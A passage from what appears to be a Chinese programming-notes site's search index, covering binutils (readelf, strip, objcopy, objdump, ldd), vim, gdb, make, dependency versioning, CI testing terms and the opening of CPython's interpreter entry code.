<p>\u5176\u4e2d\uff0c<code>00000000006000e6</code>\u8868\u793a\u94fe\u63a5\u5668\u5b89\u6392\u7ed9\u8fd9\u4e2a\u7b26\u53f7\u7684\u865a\u62df\u5185\u5b58\u5730\u5740\uff1b<code>D</code>\u8868\u793a\u5b83\u7684\u7c7b\u578b\uff0c\u5927\u5199\u662f\u5168\u5c40\u7684\u3001\u53ef\u4ee5\u8de8\u6587\u4ef6\u8bbf\u95ee\u5230\u7684\uff0c\u5c0f\u5199\u8868\u793a\u672c\u5730\u7684\u3002</p>"},{"location":"other/tools/#strip","title":"strip","text":"<p>\u4f7f\u7528strip\u53ef\u4ee5\u5254\u9664\u5176\u7b26\u53f7\u8868\uff0c\u51cf\u5c11\u6587\u4ef6\u672c\u8eab\u7684\u5927\u5c0f\u3002\u9ed8\u8ba4\u4e3a<code>-s</code>\u5254\u9664\u7684\u7b26\u53f7\uff0c\u4e5f\u53ef\u4ee5<code>-S</code>\u4ec5\u5254\u9664\u6389\u8c03\u8bd5\u7528\u7684\u7b26\u53f7\u3002 <pre><code>[ubuntu] ~/.mac/assem $ strip -S hello\n[ubuntu] ~/.mac/assem $ readelf -s hello\nSymbol table '.symtab' contains 8 entries:\n   Num:    Value          Size Type    Bind   Vis      Ndx Name\n     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND\n     1: 00000000006000d8     1 OBJECT  LOCAL  DEFAULT    2 hello\n     2: 00000000004000b0     0 SECTION LOCAL  DEFAULT    1\n     3: 00000000006000d8     0 SECTION LOCAL  DEFAULT    2\n     4: 00000000004000b0     0 NOTYPE  GLOBAL DEFAULT    1 _start\n     5: 00000000006000e6     0 NOTYPE  GLOBAL DEFAULT    2 __bss_start\n     6: 00000000006000e6     0 NOTYPE  GLOBAL DEFAULT    2 _edata\n     7: 00000000006000e8     0 NOTYPE  GLOBAL DEFAULT    2 _end\n[ubuntu] ~/.mac/assem $ strip -s hello\n[ubuntu] ~/.mac/assem $ readelf -s hello\n[ubuntu] ~/.mac/assem $ nm hello\nnm: hello: no symbols\n</code></pre></p>"},{"location":"other/tools/#objcopy","title":"objcopy","text":"<p>\u53ef\u4ee5\u5728\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u81ea\u5df1\u521b\u5efasection\uff0c\u85cf\u4e00\u4e9b\u4e1c\u897f\uff0c\u6bd4\u5982\u80cc\u666fmp3\u6587\u4ef6\u7b49\u3002\u6211\u4eec\u5c31\u53ef\u4ee5\u7528\u5230objcopy\u5de5\u5177:</p> <pre><code>[ubuntu] ~/.mac/assem $ objcopy --add-section .abc=addr.c --set-section-flags .abc=noload,readonly hello hello2\n[ubuntu] ~/.mac/assem $ readelf -S hello2\nThere are 5 section headers, starting at offset 0x190:\nSection Headers:\n  [Nr] Name              Type             Address           Offset\n       Size              EntSize          Flags  Link  Info  Align\n  [ 0]                   NULL             0000000000000000  00000000\n       0000000000000000  0000000000000000           0     0     0\n  [ 1] .text             PROGBITS         00000000004000b0  000000b0\n       0000000000000025  0000000000000000  AX       0     0     16\n  [ 2] .data             PROGBITS         00000000006000d8  000000d8\n       000000000000000e  0000000000000000  WA       0     0     4\n  [ 3] .abc              PROGBITS         0000000000000000  000000e6\n       0000000000000088  0000000000000000           0     0     1\n  [ 4] .shstrtab         STRTAB           0000000000000000  0000016e\n       000000000000001c  0000000000000000           0     0     1\n[ubuntu] ~/.mac/assem $ readelf -p .abc hello2\nString dump of section '.abc':\n  [     0]  // \u67e5\u770b\u57fa\u5740\u53d8\u5740\u7684\u5bfb\u5740\u65b9\u5f0f^J#include &lt;stdio.h&gt;^J^Jint main(){^J    int x[3];^J    for(int i=0;i&lt;3;i++){^J        x[i]= 0x22;^J\n</code></pre> <p>\u6211\u4eec\u4e3a\u53ef\u6267\u884c\u6587\u4ef6hello\u65b0\u589e\u4e86\u4e00\u4e2a<code>.abc</code>\u7684\u6bb5\uff0c\u5b83\u7684\u5185\u5bb9\u8bfb\u53d6\u81ea<code>addr.c</code>\u6587\u4ef6\uff0c\u5b83\u7684\u6743\u9650\u662f\u53ea\u8bfb\u7684\u4e14\u65e0\u9700\u8f7d\u5165\u7684\uff0c\u5e76\u4e14\u628a\u5b83\u53e6\u5b58\u4e3a\u4e86hello2\u3002\u6b64\u5916\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528\u522b\u7684\u6587\u4ef6\u7684\u5185\u5bb9\u6765\u66f4\u65b0\u67d0\u4e2asection\uff0c\u6216\u8005\u5bf9section\u8fdb\u884c\u91cd\u547d\u540d\u3001\u5220\u9664\u7b49\u64cd\u4f5c: <pre><code>[ubuntu] ~/.mac/assem $ objcopy --rename-section .abc=.demo hello2\n[ubuntu] ~/.mac/assem $ objcopy --update-section .demo=makefile hello2\n[ubuntu] ~/.mac/assem $ objcopy --remove-section .demo hello2\n</code></pre></p>"},{"location":"other/tools/#objdump","title":"objdump","text":"<p>\u4e3b\u8981\u7528\u6765\u67e5\u770b\u53cd\u6c47\u7f16\u4ee3\u7801\uff0c\u4f7f\u7528<code>objdump -d &lt;file&gt;</code>\u53cd\u6c47\u7f16\u67d0\u6587\u4ef6<code>.text</code>\u6bb5\u7684\u5185\u5bb9\uff0c\u9ed8\u8ba4\u4e3aatt\u683c\u5f0f\uff0c\u53ef\u4f7f\u7528<code>-M</code>\u6307\u5b9a\u5176\u4ed6\u683c\u5f0f\u3002 <pre><code>[ubuntu] ~/.mac/assem $ objdump -M intel -d fr\n\nfr:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n00000000004000b0 &lt;_start&gt;:\n  4000b0:   b8 01 00 00 00          mov    eax,0x1\n  4000b5:   48 85 c0                test   rax,rax\n  4000b8:   75 1b                   jne    4000d5 &lt;_start.exit&gt;\n\n00000000004000ba &lt;_start.hello&gt;:\n  4000ba:   b8 01 00 00 00          mov    eax,0x1\n  4000bf:   bf 01 00 00 00          mov    edi,0x1\n  4000c4:   48 be e0 00 60 00 00    movabs rsi,0x6000e0\n  4000cb:   00 00 00\n  4000ce:   ba 0e 00 00 00          mov    edx,0xe\n  4000d3:   0f 05                   syscall\n\n00000000004000d5 &lt;_start.exit&gt;:\n  4000d5:   b8 3c 00 00 00          mov    eax,0x3c\n  4000da:   48 31 ff                xor    rdi,rdi\n  4000dd:   0f 05                   syscall\n</code></pre></p>"},{"location":"other/tools/#ldd","title":"ldd","text":"<p>\u7528\u6765\u67e5\u770b\u53ef\u6267\u884c\u6587\u4ef6\u4f9d\u8d56\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u4fe1\u606f: <pre><code>$ ldd ./test\n\n  linux-vdso.so.1 (0x00007ffcf79ec000)\n  libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa010663000)  # \u8fd0\u884c\u5e93\n  /lib64/ld-linux-x86-64.so.2 (0x00007fa01085b000)                   # \u52a8\u6001\u94fe\u63a5\u5668\n</code></pre></p>"},{"location":"other/tools/#vim","title":"vim","text":"<p>vim\u63d0\u4f9b\u4e86\u591a\u79cd\u64cd\u4f5c\u6a21\u5f0f\uff0c\u5b83\u7684\u8bbe\u8ba1\u57fa\u4e8e\u5927\u591a\u6570\u65f6\u95f4\u90fd\u82b1\u5728\u9605\u8bfb\u3001\u6d4f\u89c8\u548c\u5c11\u91cf\u7f16\u8f91: * \u6b63\u5e38\u6a21\u5f0f\uff0c\u9ed8\u8ba4\u7684\u60c5\u51b5\uff0c\u5728\u5176\u4ed6\u6a21\u5f0f\u4e2d\u4f7f\u7528<code>&lt;Esc&gt;</code>\u8fd4\u56de\u8be5\u6a21\u5f0f * \u63d2\u5165\u6a21\u5f0f\uff0c\u7528\u4e8e\u63d2\u5165\u6587\u672c\uff0c\u6b63\u5e38\u6a21\u5f0f\u901a\u8fc7<code>i</code>\u8fdb\u5165 * \u66ff\u6362\u6a21\u5f0f\uff0c\u7528\u4e8e\u66ff\u6362\u6587\u672c\uff0c\u6b63\u5e38\u6a21\u5f0f\u901a\u8fc7<code>R</code>\u8fdb\u5165 * \u53ef\u89c6\u5316\u6a21\u5f0f\uff0c\u7528\u4e8e\u9009\u4e2d\u6587\u672c\u5757\uff0c\u6b63\u5e38\u6a21\u5f0f\u4e0b<code>v</code>\u8fdb\u5165\u4e00\u822c\u53ef\u89c6\u6a21\u5f0f\uff0c<code>V</code>\u8fdb\u5165\u53ef\u89c6\u884c\u6a21\u5f0f\uff0c<code>&lt;ctrl&gt;+v</code>\u8fdb\u5165\u53ef\u89c6\u5757\u6a21\u5f0f * \u547d\u4ee4\u6a21\u5f0f\uff0c\u7528\u4e8e\u6267\u884c\u547d\u4ee4\uff0c\u6b63\u5e38\u6a21\u5f0f\u901a\u8fc7<code>:</code>\u8fdb\u5165</p> <p>\u79fb\u52a8\u65f6\u5e38\u7528\u7684\u5feb\u6377\u952e: * \u5de6\u4e0b\u4e0a\u53f3\uff0c<code>hjkl</code> * \u8bcd\uff0c\u4e0b\u4e00\u4e2a\u8bcd<code>w</code>\uff0c\u4e0b\u4e00\u4e2a\u8bcd\u5c3e<code>e</code>\uff0c\u4e0a\u4e00\u4e2a\u8bcd\u521d<code>b</code> * \u884c\uff0c\u8be5\u884c\u5934\u90e8<code>0</code>\uff0c\u8be5\u884c\u5c3e\u90e8<code>$</code>\uff0c\u8be5\u884c\u7684\u7b2c\u4e00\u4e2a\u975e\u7a7a\u683c\u5b57\u7b26<code>^</code> * \u5c4f\u5e55\uff0c\u5c4f\u5e55\u9996\u884c<code>H</code>\uff0c\u5c4f\u5e55\u4e2d\u95f4<code>M</code>\uff0c\u5c4f\u5e55\u5e95\u90e8<code>L</code> * \u7ffb\u9875\uff0c\u4e0a\u7ffb<code>&lt;ctrl&gt;+u</code>\uff0c\u4e0b\u7ffb<code>&lt;ctrl&gt;+d</code> * \u6587\u4ef6\uff0c\u6587\u4ef6\u5934\u90e8<code>gg</code>\uff0c\u6587\u4ef6\u5c3e\u90e8<code>G</code> * \u67d0\u4e00\u884c\uff0c<code>:{\u884c\u6570}</code>\u6216<code>{\u884c\u6570}G</code> * \u6742\u9879\uff0c<code>%</code>\u5339\u914d\u4e00\u4e9b\u914d\u5bf9\u7684\u5730\u65b9\uff0c\u4f8b\u5982\u62ec\u53f7\u5bf9\uff0c<code>/* */</code>\u6ce8\u91ca\u5bf9\u7b49 * \u67e5\u627e\u672c\u884c\u7684\u4e0b\u4e00\u4e2a\u5b57\u7b26\uff0c<code>f{\u5b57\u7b26}</code>\u5411\u524d\u67e5\u627e\uff0c<code>F{\u5b57\u7b26}</code>\u5411\u540e\u67e5\u627e * \u5168\u6587\u641c\u7d22\uff0c<code>/{\u6b63\u5219\u8868\u8fbe\u5f0f}</code>\u56de\u8f66\uff0c\u7136\u540e\u4f7f\u7528<code>n</code>\u8df3\u8f6c\u5230\u4e0b\u4e00\u4e2a\u5339\u914d\u7684\u9879\uff0c<code>N</code>\u8df3\u8f6c\u5230\u4e0a\u4e00\u4e2a * \u8ba1\u6570\uff0c\u5411\u524d\u79fb\u52a83\u4e2a\u8bcd<code>3w</code>\uff0c\u5411\u4e0b\u79fb\u52a85\u884c<code>5j</code>\uff0c\u5220\u96647\u4e2a\u8bcd<code>7dw</code></p>"},{"location":"other/tools/#_4","title":"\u8c03\u8bd5\u5de5\u5177","text":"<p>GNU\u901a\u7528\u7684\u8c03\u8bd5\u5de5\u5177\uff0c\u4e5f\u53eb\u200bgdb\u3002binutils\u5c5e\u4e8e\u9759\u6001\u7684\u89c2\u5bdf\uff0c\u800cgdb\u5c31\u53ef\u4ee5\u52a8\u6001\u7684\u89c2\u5bdf\u5230\u6bcf\u4e00\u4e2a\u6c47\u7f16\u6307\u4ee4\u7684\u6267\u884c\u3002\u5b98\u65b9\u7f51\u7ad9</p> <p>\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u5e26\u56fe\u5f62\u754c\u9762\u7684\u7c7b\u4f3c\u5de5\u5177\uff0c\u4f8b\u5982gdbgui\u3002\u8fd8\u6709\u4e9bcheatsheet\u5f88\u597d\u7528\u3002</p> <p>\u5e38\u7528\u6307\u4ee4</p> \u6307\u4ee4 \u4f5c\u7528 info r \u67e5\u770b\u5bc4\u5b58\u5668 info f \u67e5\u770b\u6808\u5e27 info files \u67e5\u770b\u53ef\u6267\u884c\u6587\u4ef6\u7684section(\u9759\u6001\u89c6\u56fe) info proc mappings \u67e5\u770b\u53ef\u6267\u884c\u6587\u4ef6\u7684segment(\u52a8\u6001\u89c6\u56fe) info var \u67e5\u770b\u5168\u5c40\u53d8\u91cf info locals \u67e5\u770b\u5c40\u90e8\u53d8\u91cf info breakpoints \u67e5\u770b\u65ad\u70b9\u4fe1\u606f bt \u663e\u793a\u7a0b\u5e8f\u7684\u6808 set disassembly-flavor intel \u8bbe\u7f6e\u53cd\u6c47\u7f16\u7684\u98ce\u683c\u4e3aintel\u6216att disass \u67e5\u770b\u53cd\u6c47\u7f16 layout src \u663e\u793a\u6e90\u7801\u7a97\u53e3 display [var] \u6bcf\u6b21\u505c\u4e0b\u6765\u65f6\u90fd\u4f1a\u8f93\u51fa\u53d8\u91cfvar\u7684\u503c\uff0cvar\u53ef\u4ee5\u8bbe\u4e3a\u5bc4\u5b58\u5668 l [n] \u67e5\u770b\u7b2cN\u884c\u4ee3\u7801\u7684\u4e0a\u4e0b\u4e94\u884c c \u8fd0\u884c\u81f3\u4e0b\u4e00\u65ad\u70b9\u6216\u7a0b\u5e8f\u7ed3\u675f p/x $[var] \u4ee516\u8fdb\u5236\u8f93\u51fa\u53d8\u91cfvar\u7684\u503c\uff0c\u4e5f\u53ef\u8f93\u51fa\u8868\u8fbe\u5f0f\uff0c\u4e0d\u52a0<code>/x</code>\u4e3a\u5341\u8fdb\u5236 x/10xb [addr] \u67e5\u770b\u5185\u5b58\u5730\u5740addr\u5f00\u59cb\u768410\u7ec4\u6570\u636e\uff0c16\u8fdb\u5236\u7684\uff0c\u5355\u4f4d\u662f\u5b57\u8282"},{"location":"other/tools/#_5","title":"\u9879\u76ee\u6784\u5efa","text":""},{"location":"other/tools/#_6","title":"\u6784\u5efa\u5de5\u5177","text":"<p>GNU\u7684\u81ea\u52a8\u6784\u5efa\u5de5\u5177\u4e3a\u200bmake\uff0c\u6709\u4e9b\u50cf\u811a\u672c\u8bed\u8a00\uff0c\u628a\u4e00\u5806\u547d\u4ee4\u653e\u4e00\u8d77\u6279\u91cf\u6267\u884c\u3002\u4f7f\u7528\u5b83\u505a\u7f16\u8bd1\u5c5e\u4e8e\u589e\u91cf\u7f16\u8bd1\uff0c\u5373\u901a\u8fc7\u5bf9\u6bd4\u4fee\u6539\u65f6\u95f4\u6765\u5224\u65ad\u662f\u5426\u9700\u8981\u91cd\u65b0\u6267\u884c\u3002\u5b98\u65b9\u7f51\u7ad9</p> <pre><code>hello: hello.s\n    nasm -g -f elf64 -o hello.o hello.s\n    ld -o $@ hello.o\n\nphonytest: hello.s\n    nasm -g -f elf64 -o hello.o hello.s\n\nclean:\n    -rm *.o\n    -rm hello\n\n.PHONY: phonytest\n</code></pre> <p>\u5bf9\u4e8e\u8fd9\u6bb5\u6784\u5efa\u4ee3\u7801\uff0c<code>hello:</code>\u540e\u7684\u90e8\u5206\u5c31\u662f\u544a\u8bc9\u5b83\u8981\u53bb\u68c0\u67e5\u54ea\u4e9b\u6587\u4ef6\u7684\u4fee\u6539\u65f6\u95f4\uff1b<code>$@</code>\u5c31\u8868\u793a\u5f53\u524d\u8fd9\u6bb5\u7684\u76ee\u6807<code>hello</code>\uff0c<code>$&lt;</code>\u8868\u793a\u8fd9\u6bb5\u7684\u7b2c\u4e00\u4e2a\u4f9d\u8d56\u9879\uff0c<code>$^</code>\u8868\u793a\u8fd9\u6bb5\u7684\u6240\u6709\u4f9d\u8d56\u9879\uff1b\u547d\u4ee4\u524d\u52a0<code>-</code>\u8868\u793a\u8be5\u547d\u4ee4\u5982\u6709\u9519\u8bef\u5219\u5ffd\u7565\uff1b<code>PHONY</code>\u662f\u4e00\u4e2a\u4f2a\u6807\u7b7e\uff0c\u4e0a\u4f8b\u4e2d<code>make hello</code>\u4f1a\u5148\u68c0\u67e5\u6587\u4ef6\u662f\u4e0d\u662f\u6700\u65b0\u7684\u518d\u53bb\u6267\u884c\u547d\u4ee4\uff0c\u800c<code>make phonytest</code>\u76f4\u63a5\u5c31\u6267\u884c\u547d\u4ee4\u4e86\u3002\u53e6\u5916\uff0c\u7531\u4e8e\u5386\u53f2\u539f\u56e0makefile\u53ea\u80fd\u4f7f\u7528tab\u6765\u7f29\u8fdb\uff0c\u4e0d\u80fd\u4f7f\u7528\u7a7a\u683c\u3002</p>"},{"location":"other/tools/#_7","title":"\u4f9d\u8d56\u7ba1\u7406","text":"<p>\u4e00\u4e2a\u9879\u76ee\u53ef\u80fd\u4f1a\u4f9d\u8d56\u5f88\u591a\u5176\u4ed6\u7684\u9879\u76ee\uff0c\u5bf9\u4e8e\u5927\u591a\u6570\u8bed\u8a00\u6765\u8bb2\uff0c\u90fd\u4f1a\u6709\u4e00\u4e9b\u8f6f\u4ef6\u4ed3\u5e93\u6216\u5de5\u5177\uff0c\u8fd9\u4e9b\u4ed3\u5e93\u5728\u67d0\u4e2a\u5730\u65b9\u6258\u7ba1\u7740\u5927\u91cf\u7684\u4f9d\u8d56\uff0c\u800c\u8fd9\u4e9b\u4f9d\u8d56\u7684\u9879\u76ee\u5f80\u5f80\u6709\u5f88\u591a\u4e0d\u540c\u7684\u7248\u672c\u3002</p> <p>\u8bd5\u60f3\u4e00\u4e0b\uff0c\u5982\u679c\u4f60\u7684\u9879\u76ee\u4f7f\u7528\u4e86\u8f6f\u4ef6A\u4e2d\u7684\u67d0\u4e2a\u51fd\u6570\uff0c\u5f53\u8f6f\u4ef6A\u5347\u7ea7\u4ee5\u540e\u8be5\u51fd\u6570\u4e5f\u79fb\u9664\u6389\u4e86\uff0c\u90a3\u4e48\u4f1a\u9020\u6210\u4f60\u7684\u9879\u76ee\u4e5f\u65e0\u6cd5\u8fd0\u884c\u3002\u7248\u672c\u63a7\u5236\u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u6307\u5b9a\u5f53\u524d\u9879\u76ee\u9700\u8981\u57fa\u4e8e\u67d0\u4e2a\u7248\u672c\u6216\u8005\u67d0\u4e2a\u8303\u56f4\u7684\u7248\u672c\u6784\u5efa\u3002\u8fd9\u6837\u4e5f\u8bb8\u89e3\u51b3\u4e86\u9879\u76ee\u7684\u8fd0\u884c\u95ee\u9898\uff0c\u4f46\u5982\u679c\u8f6f\u4ef6A\u51fa\u73b0\u4e86\u5b89\u5168\u6f0f\u6d1e\uff0c\u9700\u8981\u8fdb\u884c\u5347\u7ea7\uff0c\u600e\u4e48\u6837\u8ba9\u4f9d\u8d56\u5b83\u7684\u9879\u76ee\u90fd\u8fdb\u884c\u5347\u7ea7\u5462\uff1f</p> <p>\u56e0\u6b64\uff0c\u4eba\u4eec\u5b9a\u4e49\u4e86\u4e00\u5957\u6bd4\u8f83\u5e38\u7528\u7684\u7248\u672c\u53f7\u6807\u51c6\uff0c\u79f0\u4e3aSemantic Version\u3002\u5b83\u4f7f\u7528<code>major.minor.patch</code>\u7684\u5f62\u5f0f\uff0c\u4f8b\u5982Python\u7684<code>3.7.3</code>\uff0c\u5176\u4e2d:</p> <ul> <li>\u5982\u679c\u65b0\u7684\u7248\u672c\u4e2d\u6ca1\u6709\u6539\u53d8\u4efb\u4f55API\uff0c\u5e94\u8be5\u5c06patch number\u9012\u589e</li> <li>\u5982\u679c\u6dfb\u52a0\u4e86API\u4e14\u6539\u52a8\u662f\u5411\u540e\u517c\u5bb9\u7684\uff0c\u5e94\u8be5\u5c06minor number\u9012\u589e</li> <li>\u5982\u679c\u4fee\u6539\u4e86API\u4e14\u5b83\u5e76\u4e0d\u5411\u540e\u517c\u5bb9\uff0c\u5e94\u5c06major number\u9012\u589e</li> </ul> <p>\u6b64\u5916\uff0c\u4f9d\u8d56\u7ba1\u7406\u7cfb\u7edf\u4e2d\u5f80\u5f80\u4f1a\u9047\u5230\u9501\u6587\u4ef6(lock files)\u7684\u6982\u5ff5\u3002\u8be5\u6587\u4ef6\u4e2d\u5217\u51fa\u4e86\u5f53\u524d\u9879\u76ee\u6bcf\u4e2a\u4f9d\u8d56\u5bf9\u5e94\u7684\u5177\u4f53\u7248\u672c\u53f7\uff0c\u5b83\u53ef\u4ee5\u907f\u514d\u4e0d\u5fc5\u8981\u7684\u91cd\u65b0\u7f16\u8bd1\u6216\u8005\u907f\u514d\u76f4\u63a5\u81ea\u52a8\u5b89\u88c5\u5347\u7ea7\u5230\u6700\u65b0\u7684\u7248\u672c\u3002</p> <p>\u8fd8\u6709\u4e00\u79cd\u6781\u7aef\u7684\u4f9d\u8d56\u9501\u5b9a\u53ebvendoring\uff0c\u5b83\u628a\u4f9d\u8d56\u7684\u6240\u6709\u7684\u4ee3\u7801\u62f7\u8d1d\u5230\u9879\u76ee\u4e2d\uff0c\u4f7f\u4f60\u80fd\u591f\u5b8c\u5168\u638c\u63e1\u4ee3\u7801\u7684\u4efb\u610f\u4fee\u6539\u6216\u8005\u5c06\u81ea\u5df1\u7684\u4fee\u6539\u52a0\u8fdb\u53bb\u3002</p>"},{"location":"other/tools/#_8","title":"\u6301\u7eed\u96c6\u6210","text":"<p>\u968f\u7740\u9879\u76ee\u89c4\u6a21\u8d8a\u6765\u8d8a\u5927\uff0c\u4fee\u6539\u4ee3\u7801\u4e4b\u540e\u989d\u5916\u7684\u5de5\u4f5c\u4e5f\u4f1a\u8d8a\u6765\u8d8a\u591a\uff0c\u53ef\u80fd\u662f\u4e0a\u4f20\u65b0\u7248\u7684\u6587\u6863\u3001\u4e0a\u4f20\u7f16\u8bd1\u540e\u7684\u6587\u4ef6\u3001\u53d1\u5e03\u4ee3\u7801\u5230Pypi\u3001\u6267\u884c\u6d4b\u8bd5\u7b49\u7b49\uff0c\u8fd9\u4e9b\u5de5\u4f5c\u90fd\u53ef\u4ee5\u901a\u8fc7\u6301\u7eed\u96c6\u6210\u7cfb\u7edf(Continuous integration)\u6765\u89e3\u51b3\u3002\u6709\u5f88\u591a\u6210\u719f\u7684\u5de5\u5177\uff0c\u4f8b\u5982Travis CI\u3001Github Actions\u7b49\uff0c\u5b83\u4eec\u7684\u5de5\u4f5c\u539f\u7406\u4e5f\u7c7b\u4f3c\uff0c\u5728\u4ed3\u5e93\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u7528\u4e8e\u63cf\u8ff0\u5f53\u524d\u4ed3\u5e93\u53d1\u751f\u4efb\u4f55\u4fee\u6539\u65f6\uff0c\u5e94\u8be5\u505a\u4ec0\u4e48\u3002\u6bd4\u8f83\u5e38\u89c1\u7684\u89c4\u5219\u662f\u5982\u679c\u6709\u4eba\u63d0\u4ea4\u4ee3\u7801\u65f6\uff0c\u5219\u6267\u884c\u6d4b\u8bd5\u5957\u4ef6\u3002\u7136\u540eCI\u63d0\u4f9b\u65b9\u4f1a\u542f\u52a8\u4e00\u4e2a\u6216\u591a\u4e2a\u865a\u62df\u673a\uff0c\u6267\u884c\u4f60\u5236\u5b9a\u7684\u89c4\u5219\uff0c\u5e76\u4e14\u8bb0\u5f55\u4e0b\u6765\u76f8\u5173\u7684\u6267\u884c\u7ed3\u679c\u3002</p> <p>\u5e38\u89c1\u7684\u6d4b\u8bd5\u65b9\u6cd5\u548c\u672f\u8bed\uff0c\u6211\u4eec\u9700\u8981\u6709\u4e2a\u4e86\u89e3:</p> <ul> <li>Test suite\uff0c\u6240\u6709\u6d4b\u8bd5\u7684\u7edf\u79f0</li> <li>Unit test\uff0c\u5355\u5143\u6d4b\u8bd5\uff0c\u7528\u4e8e\u5bf9\u67d0\u4e2a\u5c01\u88c5\u7684\u7279\u6027\u8fdb\u884c\u6d4b\u8bd5</li> <li>Integration test\uff0c\u96c6\u6210\u6d4b\u8bd5\uff0c\u9488\u5bf9\u7cfb\u7edf\u7684\u67d0\u4e00\u5927\u90e8\u5206\uff0c\u6d4b\u8bd5\u5176\u4e0d\u540c\u7684\u7ec4\u4ef6\u662f\u5426\u80fd\u534f\u540c\u5de5\u4f5c</li> <li>Regression test\uff0c\u56de\u5f52\u6d4b\u8bd5\uff0c\u7528\u4e8e\u4fdd\u8bc1\u4e4b\u524d\u5f15\u53d1\u7684bug\u4e0d\u4f1a\u590d\u73b0</li> <li>Mocking\uff0c\u4f7f\u7528\u5047\u7684\u6570\u636e\uff0c\u907f\u514d\u6d4b\u8bd5\u4e0d\u76f8\u5173\u7684\u5185\u5bb9\u4f8b\u5982\u7f51\u7edc\u7b49\u9020\u6210\u5f71\u54cd</li> </ul>"},{"location":"python/interpreter/","title":"CPython\u89e3\u91ca\u5668","text":""},{"location":"python/interpreter/#_1","title":"\u7f16\u7801\u89c4\u8303","text":"<p>\u50cf<code>PEP8</code>\u4e00\u6837\uff0cCPython\u4e5f\u6709\u81ea\u5df1\u7684\u4e00\u5957\u7f16\u7801\u89c4\u8303\uff0c\u4e3aPEP7\uff0c\u6709\u4e00\u4e9b\u547d\u540d\u89c4\u8303\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u66f4\u597d\u7684\u9605\u8bfb\u6e90\u7801:</p> <ul> <li>\u4f7f\u7528<code>Py</code>\u524d\u7f00\u7684\u65b9\u6cd5\u4e3a\u516c\u5171\u65b9\u6cd5\uff0c\u4f46\u4e0d\u4f1a\u7528\u4e8e\u9759\u6001\u65b9\u6cd5\u3002<code>Py_</code>\u524d\u7f00\u662f\u4e3a<code>Py_FatalError</code>\u8fd9\u6837\u7684\u5168\u5c40\u670d\u52a1\u6027\u51fd\u6570\u4fdd\u7559\u7684\uff0c\u5bf9\u4e8e\u7279\u6b8a\u7684\u7c7b\u578b(\u6bd4\u5982\u67d0\u7c7b\u5bf9\u8c61\u7684API)\u4f1a\u4f7f\u7528\u66f4\u957f\u7684\u524d\u7f00\uff0c\u4f8b\u5982<code>PyString_</code>\u90fd\u662f\u5b57\u7b26\u4e32\u7c7b\u7684\u65b9\u6cd5</li> <li>\u516c\u5171\u51fd\u6570\u548c\u53d8\u91cf\u4f7f\u7528\u9a7c\u5cf0\u52a0\u4e0a\u4e0b\u5212\u7ebf\uff0c\u4f8b\u5982PyObject_GetAttr, Py_BuildValue, PyExc_TypeError\u7b49</li> <li>\u5076\u5c14\u6709\u4e00\u4e9b\u5185\u90e8\u7684\u51fd\u6570\uff0c\u5374\u9700\u8981\u5bf9\u52a0\u8f7d\u5668\u53ef\u89c1\uff0c\u6211\u4eec\u4f7f\u7528<code>_Py</code>\u524d\u7f00\uff0c\u4f8b\u5982_PyObject_Dump</li> <li>\u5b8f\u4f7f\u7528\u9a7c\u5cf0\u524d\u7f00\u52a0\u5927\u5199\uff0c\u4f8b\u5982PyString_AS_STRING, Py_PRINT_RAW\u7b49</li> </ul>"},{"location":"python/interpreter/#_2","title":"\u6267\u884c\u65b9\u5f0f","text":""},{"location":"python/interpreter/#_3","title":"\u7a0b\u5e8f\u5165\u53e3","text":"<p>Python\u7684\u6267\u884c\u65b9\u5f0f\u6709\u4e94\u79cd:</p> <ul> <li>\u4f7f\u7528<code>python -c</code>\u6267\u884c\u5355\u6761\u8bed\u53e5</li> <li>\u4f7f\u7528<code>python -m</code>\u6267\u884c\u67d0\u4e2a\u6a21\u5757</li> <li>\u901a\u5e38\u4f7f\u7528\u7684\u8fd0\u884c\u67d0\u4e2a\u6587\u4ef6</li> <li>\u4f7f\u7528shell\u7684\u7ba1\u9053\u8fde\u63a5\uff0c\u5c06<code>stdin</code>\u7684\u5185\u5bb9\u4f5c\u4e3apython\u7684\u8f93\u5165</li> <li>\u4f7f\u7528\u4ea4\u4e92\u5f0f\u547d\u4ee4\u884c\u73af\u5883(REPL)</li> </ul> <p>\u901a\u8fc7\u8fd9\u4e09\u4e2a\u6587\u4ef6\uff0c\u6211\u4eec\u80fd\u89c2\u5bdf\u5230\u4e00\u4e2a\u6574\u4f53\u7684\u6267\u884c\u8fc7\u7a0b:</p> <ol> <li>Programs/python.c\uff0c\u4e00\u4e2a\u7b80\u5355\u7684\u6700\u521d\u7684\u7a0b\u5e8f\u5165\u53e3</li> <li>Modules/main.c\uff0c\u628a\u6574\u4e2a\u6267\u884c\u8fc7\u7a0b\u7684\u62bd\u8c61\u6253\u5305\u518d\u4e00\u8d77\uff0c\u5305\u542b\u52a0\u8f7d\u73af\u5883\u4fe1\u606f\u3001\u6267\u884c\u4ee3\u7801\u548c\u6e05\u7406\u5185\u5b58</li> <li>Python/initconfig.c\uff0c\u4ece\u7cfb\u7edf\u4e2d\u52a0\u8f7d\u73af\u5883\u53d8\u91cf\u7b49\u4fe1\u606f\uff0c\u4ee5\u53ca\u547d\u4ee4\u884c\u4e2d\u7684\u53c2\u6570\u7b49</li> </ol> cpython/Programs/python.c<pre><code>int main(int argc, char **argv)\n{\n    // unix\u5e73\u53f0\u662f_Py_UnixMain\uff0cwindows\u5e73\u53f0\u662fPy_Main\n    return _Py_UnixMain(argc, argv);\n}\n</code></pre> <p>\u7136\u540e\u662f\u9009\u62e9\u6267\u884c\u6a21\u5f0f: cpython/Modules/main.c<pre><code>int _Py_UnixMain(int argc, char **argv)\n{\n    return pymain_main(&amp;pymain);\n}\n\nstatic int pymain_main(_PyMain *pymain)\n{\n    pymain_init(pymain);\n    int res = pymain_cmdline(pymain);\n    if (res &lt; 0) {\n        _Py_FatalInitError(pymain-&gt;err);\n    }\n    if (res == 1) {\n        goto done;\n    }\n    pymain_init_stdio(pymain);\n    // 